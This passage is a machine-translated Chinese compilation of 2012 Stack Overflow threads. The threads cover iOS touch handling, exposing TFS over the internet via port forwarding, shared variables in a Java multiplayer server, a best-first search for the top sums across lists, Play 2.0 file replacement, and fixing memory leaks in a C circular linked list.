        //deal with the initial touch...
        currentView = secondView;  (work out which view you are in and store it)
    }
} 
```

然后在touchesMoved...

```
- (void)touchesMoved... (can't remember the full name)
{
    UITouch *touch = [touches anyObject];
    CGPoint point = [touch locationInView:self.view];
    if (CGRectContainsPoint(secondView, point) and currentView != secondView)) {
        // deal with the touch swapping into a new view.
        currentView = secondView;
    } else if (CGRectContainsPoint(firstView, point) and currentView != firstView)) {
        // deal with the touch swapping into a new view.
        currentView = firstView;
    }
} 
```

反正是这样的。

# networking - 通过 Internet 设置 TFS

> ID：13343771
> 
> 赞同：2
> 
> 时间：2012-11-12T12:33:30.987
> 
> 标签：networking, tfs

我已经在我的电脑上安装了 TFS，它有一个 windows7 并连接到一个具有静态 IP 地址的无线调制解调器。

我已禁用防火墙并在 WF.msc 的入站和出站规则中允许 8080 端口

电脑可以打开`computerName:8080/tfs/web`但是打不开`http://x.x.x.x:8080/tfs/web`

知道如何设置吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-12T12:35:00.033

您需要将无线路由器配置为将 8080 TCP 端口转发到您的`computerName`.

```
Protocol = TCP
Remote host = your external IP
External start port = 8080
External end port = 8080
Internal host = computerName
Internal port = 8080 
```

# java - 如何在java中使变量成为全局变量

> ID：13343772
> 
> 赞同：0
> 
> 时间：2012-11-12T12:33:36.713
> 
> 标签：java, client-server, global-variables, multiplayer, static-variables

在多人在线游戏中。如何保持变量全局？我们正在开发一个在线游戏，我们需要一个全局变量。将有一个服务器和多个客户端。我们如何保持一个公共变量是静态的，并且所有客户端都可以同步编辑。我们有什么建议吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-12T12:40:32.190

如果您移动到集群，拥有基于堆的变量将成为一个问题，因为它不够全局（每个节点将有一个单独的副本）。

如果这不是问题，并且如果“变量”是指简单的东西，如字符串或长整型，那么最好的选择是使用`java.util.concurrent.Atomic*`类。例如，

```
public static final AtomicLong id = new AtomicLong(); 
```

这样做最重要的优点是它可以使用 compare-and-swap 和 get-and-set 进行原子更新，例如`id.getAndIncrement();`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T12:41:30.747

*服务器*必须控制变量。

当客户端想要修改那个变量时，他们不会改变它，他们必须向服务器发送一条消息，告诉服务器新的想要的值。服务器存储它并向所有客户端广播消息，然后它们都使用新值更新该变量。

当然，如果服务器自己修改，它只是广播新的值。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-12T13:16:18.793

**-** `public static final`用于在 Java 中创建一个全局变量。

**-**但 then`volatile`必须用于此，以便**操作直接发生在内存中并直接从内存中读取。**

**-**最好使用 `java.util.concurrent.Atomic`.

**-**您可以使用`AtomicInteger`,`AtomicLong`等`AtomicReference`....

# algorithm - 从多个列表中的元素中找出 (100) 个最高和

> ID：13343773
> 
> 赞同：5
> 
> 时间：2012-11-12T12:33:37.287
> 
> 标签：algorithm, combinations

我有以下问题（在我的版本中，有一些限制可能使问题更容易解决，但一般的解决方案也很好）：

我有 4 个列表，有 10 个条目。第一个列表包含 0 到 6 之间的整数条目，其他三个包含 0 到 3 之间的条目。我现在必须找到这四个列表中元素的 100 个最佳组合。一种组合由 4 个值的总和组成，每个列表中一个。请注意，我不仅需要知道结果元素的值，还需要知道它们是如何组成的，因为有更多与这些值相关的信息。

**示例 1：**

```
list A: 6, 3, 2, 2, 1, 0, 0, 0, 0
list B: 3, 2, 0, 0, 0, 0, 0, 0, 0
list C: 2, 2, 0, 0, 0, 0, 0, 0, 0
list D: 3, 1, 1, 1, 1, 1, 0, 0, 0 
```

在这种情况下，五种最佳组合是：

*   14（A[0] + B[0] + C[0] + D[0]）
*   14 (A[0] + B[0] + C[1] + D[0])
*   13 (A[0] + B[1] + C[0] + D[0])
*   13 (A[0] + B[1] + C[1] + D[0])
*   12 (A[0] + B[0] + C[0] + D[1])

请注意，我已经对列表的条目进行了排序，因为这可能是大多数解决此问题的算法的第一步。

## 简单的解决方案

最简单的解决方案包括形成所有 10.000 种可能的组合，然后从中选出一百个最佳组合。甚至不必对 10.000 种可能的组合进行排序。可以首先扫描数组并分析哪个值出现的频率。然后可以在下一次扫描这些值时选择一百个最佳值（及其进一步的属性）。

## 一个不起作用的解决方案

我想到的另一个想法是：第一个必须对列表进行排序。在每个列表中，我想找到一个索引，它将那些可以对解决方案做出贡献的条目与不能做出贡献的条目分开。当必须在示例 1 中找到四个最佳组合时，例如可以选择列表和 的前两个元素，以及列表`B`和`C`的第一个元素`A`，`D` 这将产生：

```
A: 6
B: 3, 2
C: 3, 2
D: 3 
```

这些子列表的所有组合都将产生最佳解决方案。然而，这并不总是可能的，如以下示例所示：

**示例 2：**

（这次只有两个列表）

```
list A: 6, 5, 5, 0, 0, ...
list B: 3, 1, 1, 0, 0, ... 
```

在这里，最好的四个解决方案是

*   6 + 3
*   5 + 3
*   5 + 3
*   6 + 1

但是，无法使用索引找到此解决方案，索引将四种组合与所有其他组合分开。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-12T16:16:37.540

让我尝试以更简洁的方式重新表述现有的答案（Evgeny Kluev，solendil）。

解决方案是从配置 (0,0,0,0) 开始的[最佳优先搜索。](http://en.wikipedia.org/wiki/Best-first_search)搜索树的分支因子为 4（列表的数量）。

在 (0,0,0,0) 处，您知道下一个最佳配置是 (1,0,0,0)、(0,1,0,0)、(0,0,1,0) 之一或 (0,0,0,1)。因此，您将搜索树的这些“叶子”放入按每个配置的好坏排序的优先级队列中。叶子队列是下一个最佳配置候选队列。

然后，您从队列中取出最佳配置以添加到答案列表并更新队列。例如，如果 (0,0,1,0) 是下一个最好的，则将其从队列中取出，然后添加其子项 - (1,0,1,0)，(0,1,1,0)， (0,0,2,0), (0,0,1,1) - 到队列中。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-12T13:28:55.373

该解决方案使用两种数据结构：

1.  优先队列，其中列表元素的总和是键，列表索引的元组是值。
2.  包含列表索引元组的哈希集。

算法：

1.  对每个列表进行排序。
2.  将包含每个列表的第一个元素的元组放入队列中。
3.  当哈希集包含少于 100 个元组时，请执行第 4 步和第 5 步。
4.  从队列中弹出最大的项目，检查哈希集是否包含对应的索引元组（T）。如果找到这样的元组，则重复步骤 4，否则继续步骤 5。
5.  将元组 T 插入哈希集中。创建 N 个元组（其中 N 是列表的数量），每个元组的 N-1 个索引等于 T 中的对应索引，并且一个索引大一，并将这些元组插入队列中。

可能实现优先级队列（对于这个问题）的最佳方法是使用有序容器（二叉搜索树或跳过列表），首先按列表元素的总和排序，然后按列表索引。这使得不需要单独的哈希集，因为该容器可以在将重复项添加到队列之前检测它们。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-12T13:50:21.173

我的回答的先决条件：解决方案表示为 4 位数字。0000(14) 表示取每个列表的第一个元素的解决方案，得分为 14。1052(7) 取第一个列表的第二个，第二个的第一个，第三个的第六个和第四个的第三个，得分为7.

现在，您从 0000(14) 开始构建一棵树，并通过将四个数字中的每一个都加 1 来查找所有叶子，即 1000(11)、0100(13)、0010(14) 和 0001(12)。你最好的总和是 14，0010(14) 成为一个分支（是解决方案的一部分），你计算它的叶子，即 1010(11)、0110(13)、0020(12) 和 0011(12)。所有叶子的最佳总和是 13，您将这些叶子设置为分支，计算它们的叶子等，直到您长出 100 个解决方案。

此方法通过 20 个步骤解决了您的示例问题，计算了 102 个分支和 188 个叶子。

这是一个解决您的问题的（粗略的）Java 程序。

```
package HighestSums;

import java.util.ArrayList;
import java.util.Collection;
import java.util.Collections;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;
import java.util.Set;

public class HighestSums {

static int[][] data = {
                {6, 3, 2, 2, 1, 0, 0, 0, 0, 0},
                {3, 2, 0, 0, 0, 0, 0, 0, 0, 0},
                {2, 2, 0, 0, 0, 0, 0, 0, 0, 0},
                {3, 1, 1, 1, 1, 1, 0, 0, 0, 0}
};

static Set<Solution> branches = new HashSet<Solution>();
static Set<Solution> leaves = new HashSet<Solution>();

public static void main(String[] args) {
    Solution s = new Solution();
    leaves.add(s);
    int sum = s.getSum();

    for (int i=0; i<100; i++) {
        System.out.println("======== STEP " + i);
        System.out.println("-- Nb Branches : " + branches.size());
        System.out.println("-- Nb Leaves : " + leaves.size());
        if (branches.size()>100)
            return;
        sum = max(leaves);
        step(sum);
        System.out.println("Sum : " + sum);
        System.out.println("Res\n" + toStr(branches));
        System.out.println("Analyse\n" + toStr(leaves));
    }
}

private static int max(Set<Solution> analyse2) {
    List<Solution> disp = new ArrayList<HighestSums.Solution>();
    disp.addAll(analyse2);
    Collections.sort(disp);
    return disp.get(0).getSum();
}

private static String toStr(Collection<Solution> l) {
    List<Solution> disp = new ArrayList<HighestSums.Solution>();
    disp.addAll(l);
    Collections.sort(disp);
    String res = "";
    for (Solution s : disp)
        res += s.toString()+"\n";
    return res;
}

private static void step(int sum) {
    List<Solution> created = new ArrayList<Solution>();
    for (Iterator<Solution> it = leaves.iterator(); it.hasNext(); ) {
        Solution a = it.next();
        if (a.getSum()==sum) {
            it.remove();
            branches.add(a);
            for (Solution a2 : a.next()) {
                if (branches.contains(a2) || leaves.contains(a2))
                    continue;
                created.add(a2);
            }
        }
    }
    leaves.addAll(created);
}

static class Solution implements Comparable<Solution>{
    int[] ix = new int[4];
    Solution parent;
    public Solution(Solution sol) {
        System.arraycopy(sol.ix, 0, ix, 0, sol.ix.length);
        parent = sol;
    }
    public Solution() {}
    public String toString() {
        String res = "";
        for (int i=0; i<4; i++) 
            res += ix[i]; 
        res += " " + getSum(); 
        if (parent != null) 
            res += " (" + parent.toString() + ")";
        return res;
    }
    public List<Solution> next() {
        List<Solution> res = new ArrayList<Solution>();
        for (int i=0; i<4; i++) {
            if (ix[i]<9) {
                Solution s2 = new Solution(this);
                s2.ix[i]+=1;
                res.add(s2);
            }
        }
        return res;
    }
    private int getSum() {
        int res = 0;
        for (int i=0; i<4; i++) 
            res += data[i][ix[i]]; 
        return res;
    }
    @Override
    public boolean equals(Object obj) {
        Solution s = (Solution)obj;
        for (int i=0; i<4; i++) 
            if (ix[i]!=s.ix[i])
                return false;
        return true;
    }
    @Override
    public int hashCode() {
        return ix[0]+ix[1]*10+ix[2]*100+ix[3]*1000;
    }
    @Override
    public int compareTo(Solution o) {
        return o.getSum() - getSum();
    }
}

} 
```

现在解决方案（所有 102 次出现）：

```
0000 14
0010 14 (0000 14)
0100 13 (0000 14)
0110 13 (0010 14 (0000 14))
0011 12 (0010 14 (0000 14))
0003 12 (0002 12 (0001 12 (0000 14)))
0080 12 (0070 12 (0060 12 (0050 12 (0040 12 (0030 12 (0020 12 (0010 14 (0000 14))))))))
0014 12 (0013 12 (0012 12 (0011 12 (0010 14 (0000 14)))))
0030 12 (0020 12 (0010 14 (0000 14)))
0004 12 (0003 12 (0002 12 (0001 12 (0000 14))))
0060 12 (0050 12 (0040 12 (0030 12 (0020 12 (0010 14 (0000 14))))))
0040 12 (0030 12 (0020 12 (0010 14 (0000 14))))
0070 12 (0060 12 (0050 12 (0040 12 (0030 12 (0020 12 (0010 14 (0000 14)))))))
0005 12 (0004 12 (0003 12 (0002 12 (0001 12 (0000 14)))))
0002 12 (0001 12 (0000 14))
0012 12 (0011 12 (0010 14 (0000 14)))
0090 12 (0080 12 (0070 12 (0060 12 (0050 12 (0040 12 (0030 12 (0020 12 (0010 14 (0000 14)))))))))
0013 12 (0012 12 (0011 12 (0010 14 (0000 14))))
0020 12 (0010 14 (0000 14))
0001 12 (0000 14)
0050 12 (0040 12 (0030 12 (0020 12 (0010 14 (0000 14)))))
0015 12 (0014 12 (0013 12 (0012 12 (0011 12 (0010 14 (0000 14))))))
1000 11 (0000 14)
0200 11 (0100 13 (0000 14))
0111 11 (0110 13 (0010 14 (0000 14)))
0180 11 (0080 12 (0070 12 (0060 12 (0050 12 (0040 12 (0030 12 (0020 12 (0010 14 (0000 14)))))))))
0300 11 (0200 11 (0100 13 (0000 14)))
0130 11 (0030 12 (0020 12 (0010 14 (0000 14))))
0006 11 (0005 12 (0004 12 (0003 12 (0002 12 (0001 12 (0000 14))))))
0400 11 (0300 11 (0200 11 (0100 13 (0000 14))))
0114 11 (0014 12 (0013 12 (0012 12 (0011 12 (0010 14 (0000 14))))))
0017 11 (0016 11 (0015 12 (0014 12 (0013 12 (0012 12 (0011 12 (0010 14 (0000 14))))))))
0500 11 (0400 11 (0300 11 (0200 11 (0100 13 (0000 14)))))
0600 11 (0500 11 (0400 11 (0300 11 (0200 11 (0100 13 (0000 14))))))
0160 11 (0060 12 (0050 12 (0040 12 (0030 12 (0020 12 (0010 14 (0000 14)))))))
0700 11 (0600 11 (0500 11 (0400 11 (0300 11 (0200 11 (0100 13 (0000 14)))))))
0104 11 (0004 12 (0003 12 (0002 12 (0001 12 (0000 14)))))
0800 11 (0700 11 (0600 11 (0500 11 (0400 11 (0300 11 (0200 11 (0100 13 (0000 14))))))))
0009 11 (0008 11 (0007 11 (0006 11 (0005 12 (0004 12 (0003 12 (0002 12 (0001 12 (0000 14)))))))))
0900 11 (0800 11 (0700 11 (0600 11 (0500 11 (0400 11 (0300 11 (0200 11 (0100 13 (0000 14)))))))))
0018 11 (0017 11 (0016 11 (0015 12 (0014 12 (0013 12 (0012 12 (0011 12 (0010 14 (0000 14)))))))))
1010 11 (0010 14 (0000 14))
0103 11 (0003 12 (0002 12 (0001 12 (0000 14))))
0210 11 (0110 13 (0010 14 (0000 14)))
0140 11 (0040 12 (0030 12 (0020 12 (0010 14 (0000 14)))))
0410 11 (0310 11 (0210 11 (0110 13 (0010 14 (0000 14)))))
0016 11 (0015 12 (0014 12 (0013 12 (0012 12 (0011 12 (0010 14 (0000 14)))))))
0310 11 (0210 11 (0110 13 (0010 14 (0000 14))))
0008 11 (0007 11 (0006 11 (0005 12 (0004 12 (0003 12 (0002 12 (0001 12 (0000 14))))))))
0105 11 (0005 12 (0004 12 (0003 12 (0002 12 (0001 12 (0000 14))))))
0510 11 (0410 11 (0310 11 (0210 11 (0110 13 (0010 14 (0000 14))))))
0710 11 (0610 11 (0510 11 (0410 11 (0310 11 (0210 11 (0110 13 (0010 14 (0000 14))))))))
0102 11 (0002 12 (0001 12 (0000 14)))
0610 11 (0510 11 (0410 11 (0310 11 (0210 11 (0110 13 (0010 14 (0000 14)))))))
0112 11 (0012 12 (0011 12 (0010 14 (0000 14))))
0190 11 (0090 12 (0080 12 (0070 12 (0060 12 (0050 12 (0040 12 (0030 12 (0020 12 (0010 14 (0000 14))))))))))
0910 11 (0810 11 (0710 11 (0610 11 (0510 11 (0410 11 (0310 11 (0210 11 (0110 13 (0010 14 (0000 14))))))))))
0810 11 (0710 11 (0610 11 (0510 11 (0410 11 (0310 11 (0210 11 (0110 13 (0010 14 (0000 14)))))))))
0101 11 (0100 13 (0000 14))
0007 11 (0006 11 (0005 12 (0004 12 (0003 12 (0002 12 (0001 12 (0000 14)))))))
0120 11 (0110 13 (0010 14 (0000 14)))
0150 11 (0050 12 (0040 12 (0030 12 (0020 12 (0010 14 (0000 14))))))
0170 11 (0070 12 (0060 12 (0050 12 (0040 12 (0030 12 (0020 12 (0010 14 (0000 14))))))))
0115 11 (0015 12 (0014 12 (0013 12 (0012 12 (0011 12 (0010 14 (0000 14)))))))
0019 11 (0018 11 (0017 11 (0016 11 (0015 12 (0014 12 (0013 12 (0012 12 (0011 12 (0010 14 (0000 14))))))))))
0113 11 (0013 12 (0012 12 (0011 12 (0010 14 (0000 14)))))
0022 10 (0012 12 (0011 12 (0010 14 (0000 14))))
2000 10 (1000 11 (0000 14))
3000 10 (2000 10 (1000 11 (0000 14)))
1100 10 (0100 13 (0000 14))
0091 10 (0090 12 (0080 12 (0070 12 (0060 12 (0050 12 (0040 12 (0030 12 (0020 12 (0010 14 (0000 14))))))))))
0106 10 (0105 11 (0005 12 (0004 12 (0003 12 (0002 12 (0001 12 (0000 14)))))))
0041 10 (0040 12 (0030 12 (0020 12 (0010 14 (0000 14)))))
0061 10 (0060 12 (0050 12 (0040 12 (0030 12 (0020 12 (0010 14 (0000 14)))))))
0072 10 (0071 10 (0070 12 (0060 12 (0050 12 (0040 12 (0030 12 (0020 12 (0010 14 (0000 14)))))))))
0033 10 (0023 10 (0013 12 (0012 12 (0011 12 (0010 14 (0000 14))))))
0025 10 (0015 12 (0014 12 (0013 12 (0012 12 (0011 12 (0010 14 (0000 14)))))))
0109 10 (0009 11 (0008 11 (0007 11 (0006 11 (0005 12 (0004 12 (0003 12 (0002 12 (0001 12 (0000 14))))))))))
0082 10 (0081 10 (0080 12 (0070 12 (0060 12 (0050 12 (0040 12 (0030 12 (0020 12 (0010 14 (0000 14))))))))))
0052 10 (0051 10 (0050 12 (0040 12 (0030 12 (0020 12 (0010 14 (0000 14)))))))
0117 10 (0017 11 (0016 11 (0015 12 (0014 12 (0013 12 (0012 12 (0011 12 (0010 14 (0000 14)))))))))
0024 10 (0014 12 (0013 12 (0012 12 (0011 12 (0010 14 (0000 14))))))
0031 10 (0030 12 (0020 12 (0010 14 (0000 14))))
0023 10 (0013 12 (0012 12 (0011 12 (0010 14 (0000 14)))))
2010 10 (1010 11 (0010 14 (0000 14)))
3010 10 (2010 10 (1010 11 (0010 14 (0000 14))))
0032 10 (0022 10 (0012 12 (0011 12 (0010 14 (0000 14)))))
1110 10 (0110 13 (0010 14 (0000 14)))
0118 10 (0018 11 (0017 11 (0016 11 (0015 12 (0014 12 (0013 12 (0012 12 (0011 12 (0010 14 (0000 14))))))))))
0081 10 (0080 12 (0070 12 (0060 12 (0050 12 (0040 12 (0030 12 (0020 12 (0010 14 (0000 14)))))))))
0108 10 (0008 11 (0007 11 (0006 11 (0005 12 (0004 12 (0003 12 (0002 12 (0001 12 (0000 14)))))))))
0051 10 (0050 12 (0040 12 (0030 12 (0020 12 (0010 14 (0000 14))))))
0116 10 (0016 11 (0015 12 (0014 12 (0013 12 (0012 12 (0011 12 (0010 14 (0000 14))))))))
0062 10 (0061 10 (0060 12 (0050 12 (0040 12 (0030 12 (0020 12 (0010 14 (0000 14))))))))
0071 10 (0070 12 (0060 12 (0050 12 (0040 12 (0030 12 (0020 12 (0010 14 (0000 14))))))))
0035 10 (0025 10 (0015 12 (0014 12 (0013 12 (0012 12 (0011 12 (0010 14 (0000 14))))))))
0034 10 (0024 10 (0014 12 (0013 12 (0012 12 (0011 12 (0010 14 (0000 14)))))))
0107 10 (0007 11 (0006 11 (0005 12 (0004 12 (0003 12 (0002 12 (0001 12 (0000 14))))))))
0042 10 (0041 10 (0040 12 (0030 12 (0020 12 (0010 14 (0000 14))))))
0119 10 (0019 11 (0018 11 (0017 11 (0016 11 (0015 12 (0014 12 (0013 12 (0012 12 (0011 12 (0010 14 (0000 14)))))))))))
0021 10 (0011 12 (0010 14 (0000 14)))
0092 10 (0091 10 (0090 12 (0080 12 (0070 12 (0060 12 (0050 12 (0040 12 (0030 12 (0020 12 (0010 14 (0000 14))))))))))) 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-12T13:06:43.517

只要最大总和较低，这是一个可以正常工作的解决方案。它的复杂性是`O(N*M)`，其中`N`是列表的数量，`M`是每个列表的大小。

创建一个二维数组`[4,16]`，其中每个条目都包含此结构的列表：`{ Reference, Index }`.

例如，从您的示例中，条目 at`[1,9]`将存储一个`Reference`到单元格`[0,6]`，`Index`并将存储对第二个列表中第一项的引用（值`3`）。它们存储在单元格中，`9`因为总和为 9，`Index`+`Reference`是获取值的路径`9`。每个单元格存储此类参考组合的列表。

```
for (int i = 0; i < 4; i++)
{
  foreach (var v in lists[i])
  {
    if (i == 0)
    {
      result[i, v].Add({ Reference = null, Index = v.Index });
      continue;
    }
    for (int j = 15; j >= 0; j--)
    {
      result[i, v + j].Add({ Reference = result[i-1, j].Pointer, Index = v.Index });
    }
  }
} 
```

现在您有 15 个树结构要遍历以寻找最好的 100 个。您查看`results[3, 15]`并递归遍历引用。如果您的最后一个（第 4 个）列表已排序，那么您可以在添加最后一个值时执行此遍历。其他列表不必排序。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-12T13:29:25.280

列表 A: 6, 5, 5, 0, 0, ... 列表 B: 3, 1, 1, 0, 0, ...

在开始数组上：6（来自 listA 的项目）并且未使用元素，该项目索引来自 B（开始 - 0）5 和索引...

从此数组中选择最大值。选定项目的增量索引。

重复直到列表 A 的最后一项设置索引 - （列表 B 中的元素计数）。

# scala - 使用 Play 2.0 上传 Ajax 文件：存在但替换参数为 false

> ID：13343778
> 
> 赞同：5
> 
> 时间：2012-11-12T12:33:58.813
> 
> 标签：scala, file-upload, playframework-2.0

我正在客户端使用 Valum 实现 Ajax 文件上传并播放！2.0.4 在服务器端。我的操作方法如下所示：

```
 def ajaxup = Action(parse.temporaryFile) { request =>
    try {
      request.body.moveTo(new File("/somepath/foo.jpg"))
    } catch {
      case e: Exception => Logger.error(e.getMessage)
    }
    Ok("File uploaded")
  } 
```

上传工作正常，即文件正确保存`foo.jpg`在`/somepath/`. 但它也抛出异常：

```
Path(/somepath/foo.jpg) exists but replace parameter is false 
```

我怎样才能避免这种情况？我需要在我正在创建的文件上设置任何属性吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-12T12:47:26.287

我假设您要覆盖现有文件`/somepath/foo.jpg`。如果您不这样做，请先检查该文件是否已存在。

无论如何，错误消息已经给了你一个提示。查看案例类的[文档。](http://www.playframework.org/documentation/api/2.0.1/scala/play/api/libs/Files%24%24TemporaryFile.html)`TemporaryFile`该`moveTo`方法可以有2个参数；第二个默认为`false`并指示您要替换现有文件。

所以，简而言之，而不是

```
request.body.moveTo(new File("/somepath/foo.jpg")) 
```

你写

```
request.body.moveTo(new File("/somepath/foo.jpg"), true) 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-12T12:45:07.283

从[moveTo() API doc](http://www.playframework.org/documentation/api/2.0.4/scala/index.html#play.api.libs.Files%24%24TemporaryFile)中，要替换文件，您应该使用：

```
request.body.moveTo(new File("/somepath/foo.jpg"), true) 
```

# c - 在循环双向链表中释放内存

> ID：13343780
> 
> 赞同：6
> 
> 时间：2012-11-12T12:34:03.137
> 
> 标签：c, segmentation-fault, malloc, valgrind, circular-list

valgrind 告诉我，我在 XX 个块中有 XX 个字节肯定丢失了记录等等

并且源代码在 malloc 中，但是，我认为这是因为我没有为 malloc 释放足够的内存。无论如何，我已经提供了我认为导致堆错误的代码。

我知道我没有释放 list_remove 中的内存，我很确定这是问题的唯一来源。它可能需要一些临时的转变，但我不知道这是否是唯一的问题。

```
list_t *list_remove(list_t *list, list_t *node) {
    list_t *oldnode = node;
    node->prev->next = node->next;
    node->next->prev = node->prev;
    if (list != oldnode) {
        free(oldnode);
        return list;
    } else {
         list_t *value = list->next == list ? NULL : list->next;
     free(oldnode);
        return value;
    }
}

void list_free(list_t *list) {
    if (list) {
       while (list_remove(list, list_last(list)) != NULL) {}
    } 
} 
```

list last 只是给出列表的最后一个节点。

编辑：我很抱歉没有提供足够的信息，Kerrek SB，alk。这是其余的代码，您可以看到 malloc 发生在 newnode 中，我可以在其中开始创建新列表。这个结构很简单，有一个值和一个上一个，下一个：

```
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include "ll.h"

struct list {
    char *value;
    struct list *next;
    struct list *prev;
};

const char *list_node_value(list_t *node) {
    return node->value;
}

list_t *list_first(list_t *list) {
    return list;
}

list_t *list_last(list_t *list) {
    return list->prev;
}

list_t *list_next(list_t *node) {
    return node->next;
}

list_t *list_previous(list_t *node) {
    return node->prev;
}

static void failed_allocation(void) {
    fprintf(stderr, "Out of memory.\n");
    abort();
}

static list_t *new_node(const char *value) {
    list_t *node = malloc(sizeof(list_t));
    if (!node) failed_allocation();
    node->value = malloc(strlen(value)+1);
    if (!node->value) failed_allocation();
    strcpy(node->value, value);
    return node;
}

list_t *list_insert_before(list_t *list, list_t *node, const char *value) {
    list_t *insert_node = new_node(value);
    insert_node->prev = node->prev;
    insert_node->next = node;
    insert_node->next->prev = insert_node;
    insert_node->prev->next = insert_node;
    if (list == node) {
        return insert_node;
    } else {
        return list;
    }
}

list_t *list_append(list_t *list, const char *value) {
    if (list) {
        (void) list_insert_before(list, list, value);
        return list;
    } else {
        list_t *node = new_node(value);
        node->prev = node->next = node;
        return node;
    }
}

list_t *list_prepend(list_t *list, const char *value) {
    if (list) {
        return list_insert_before(list, list, value);
    } else {
        list_t *node = new_node(value);
        node->prev = node->next = node;
        return node;
    }
}

list_t *list_remove(list_t *list, list_t *node) {
    list_t *oldnode = node;
    node->prev->next = node->next;
    node->next->prev = node->prev;
    if (list != oldnode) {
        free(oldnode);
        return list;
    } else {
         list_t *value = list->next == list ? NULL : list->next;
     free(oldnode);
        return value;
    }
}

void list_free(list_t *list) {
    if (list) {
       while (list_remove(list, list_last(list)) != NULL) {}
    } 
}

void list_foreach(list_t *list, void (*function)(const char*)) {
    if (list) {
        list_t *cur = list_first(list);
        do {
            function(cur->value);
            cur = cur->next;
        } while (cur != list_first(list));
    }
} 
```

请帮忙！它仍然给我堆中的内存泄漏错误......

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-12T13:49:25.573

如果您担心 list_free() 我建议您在源头上强化删除链 以下假设，当一切都完成后，您希望 *list 为 NULL（因为整个列表刚刚被删除）。

```
void list_free(list_t **list) 
{
    if (list && *list)
    {
        list_t* next = (*list)->next;
        while (next && (next != *list))
        {
            list_t *tmp = next;
            next = next->next;
            free(tmp);
        }

        free(*list);
        *list = NULL;
    }
} 
```

或类似的东西。通过传递外部列表指针的*地址*来调用：

```
list_t *list = NULL;

.. initialize and use your list...

// free the list
list_free(&list); 
```

* * *

**编辑**在 OP 发布更多代码之后，有几件事很明显。

1.  `list_newnode()`不设置的值，`prev`因此`next`它们包含垃圾。
2.  这里的所有其他函数都假设 (1) 正确初始化了 next 和 prev。坦率地说，我很惊讶这在第二次添加开始时并没有错。

循环列表插入*必须*假设被插入的新节点可以是初始列表本身。看来你正在做这方面的努力*比*它需要的要困难得多。请记住，循环列表可以将*任何节点作为列表头，这与**删除*当前列表“头”时的情况一样好。*当这种情况发生时，必须*有一种机制来为调用者重新建立新的列表“头”。当删除最后一个节点时，这种相同的机制*必须*允许将列表头设置为 NULL。

您的代码似乎在不使用指针的情况下公开尝试执行此操作，但它们使循环链表的任务*变得*更加容易。代码中的其他注意事项：

*   您的大多数函数似乎都试图通过返回值向调用者*建议*列表头应该是什么。相反，他们应该通过 in/out 参数*强制执行它。*
*   *任何*相对于另一个插入新节点的函数都应该返回新节点。
*   `list_prepend()`和`list_append()`函数应该被认为是相对于列表头的核心插入函数**。**其他 api（`list_insert_before()`,`list_insert_after()`等）应该完全与您在之前或之后插入的有效**现有节点相关，并且正如我上面所说，***始终*返回指向新插入节点的指针。您将看到两个非基于根的插入器函数都不再传递列表头。
*   您的大多数实用程序函数都是正确的，除了在执行取消引用之前不检查无效指针。还有一些没有，但至少现在可以管理。

以下是围绕您的大多数功能构建的代码床。实际的节点放置例程已经完成，我尽我所能评论它们。主要测试夹具非常简单。如果这里有重大错误，我相信 SO-watchtower 会很快指出它们，但代码的重点不仅仅是修复你的；这是一个学习的东西：

```
#include <stdio.h>
#include <stdlib.h>
#include <memory.h>
#include <string.h>
#include <assert.h>

// node structure
typedef struct list_t {
    char *value;
    struct list_t *next;
    struct list_t *prev;
} list_t;

static void failed_allocation(void) {
    fprintf(stderr, "Out of memory.\n");
    abort();
}

// initialize a linked list header pointer. Just sets it to NULL.
void list_init(list_t** listpp)
{
    if (listpp)
        *listpp = NULL;
}

// return the value-field of a valid list node.
// otherwise return NULL if node is NULL.
const char *list_node_value(list_t *node)
{
    return (node ? node->value : NULL);
}

// return the next pointer (which may be a self-reference)
//  of a valid list_t pointer.
list_t *list_next(list_t *node)
{
    return (node ? node->next : NULL);
}

// return the previous pointer (which may be a self-reference)
//  of a valid list_t pointer.
list_t *list_previous(list_t *node)
{
    return (node ? node->prev : NULL);
}

// return the same pointer we were passed.
list_t *list_first(list_t *headp)
{
    return headp;
}

// return the previous pointer (which may be a self-reference)
//  of the given list-head pointer.
list_t *list_last(list_t *headp)
{
    return list_previous(headp);
}

// insert a new item at the end of the list, which means it
//  becomes the item previous to the head pointer. this handles
//  the case of an initially empty list, which creates the first
//  node that is self-referencing.
list_t *list_append(list_t **headpp, const char* value)
{
    if (!headpp) // error. must pass the address of a list_t ptr.
        return NULL;

    // allocate a new node.
    list_t* p = malloc(sizeof(*p));
    if (p == NULL)
        failed_allocation();

    // setup duplicate value
    p->value = (value) ? strdup(value) : NULL;

    // insert the node into the list. note that this
    //  works even when the head pointer is an initial
    //  self-referencing node.
    if (*headpp)
    {
        (*headpp)->prev->next = p;
        p->prev = (*headpp)->prev;
        p->next  = (*headpp);
        (*headpp)->prev = p;
    }
    else
    {   // no prior list. we're it. self-reference
        *headpp = p;
        p->next = p->prev = p;
    }
    return p;
}

// insert a new value into the list, returns a pointer to the
//  node allocated to hold the value. this will ALWAYS update
//  the given head pointer, since the new node is being prepended
//  to the list and by-definition becomes the new head.
list_t *list_prepend(list_t **headpp, const char* value)
{
    list_append(headpp, value);
    if (!(headpp && *headpp))
        return NULL;
    *headpp = (*headpp)->prev;
    return *headpp;
}

// insert a new node previous to the given valid node pointer.
// returns a pointer to the inserted node, or NULL on error.
list_t *list_insert_before(list_t* node, const char* value)
{
    // node *must* be a valid list_t pointer.
    if (!node)
        return NULL;
    list_prepend(&node, value);
    return node;
}

// insert a new node after the given valid node pointer.
// returns a pointer to the inserted node, or NULL on error.
list_t *list_insert_after(list_t* node, const char* value)
{
    // node *must* be a valid list_t pointer.
    if (!node)
        return NULL;
    node = node->next;
    list_prepend(&node, value);
    return node;
}

